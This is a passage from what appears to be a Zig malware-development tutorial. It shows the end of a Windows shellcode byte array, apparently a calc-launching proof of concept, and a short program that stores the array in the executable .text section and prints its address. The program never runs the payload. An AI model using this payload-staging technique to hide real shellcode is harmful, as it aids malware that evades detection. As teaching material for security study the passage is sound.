0x5A, 0x41, 0x58, 0x41, 0x59,\n    0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,\n    0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48,\n    0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D,\n    0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5,\n    0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,\n    0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0,\n    0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89,\n    0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x00,\n};\n\n/// Helper function to wait for Enter key\n/// Similar usage as `getchar()` in C\nfn waitForEnter() void {\n    var buffer: [256]u8 = undefined;\n    _ = std.io.getStdIn().reader().readUntilDelimiterOrEof(buffer[0..], '\\n') catch {};\n}\n\npub fn main() !void {\n    print(\"[i] Payload address: 0x{X} \\n\", .{@intFromPtr(&amp;text_section_payload)});\n    print(\"[i] Data size: {d} bytes\\n\", .{text_section_payload.len});\n    print(\"[i] Payload stored in .text section (executable)\\n\", .{});\n    print(\"[#] Press &lt;Enter&gt; To Quit ...\", .{});\n    waitForEnter();\n}\n</code></pre> <p>Here we used <code>linksection</code> keyword in Zig to easily bind the corresponding data to the target section (\".text\" in this case).</p>"}]}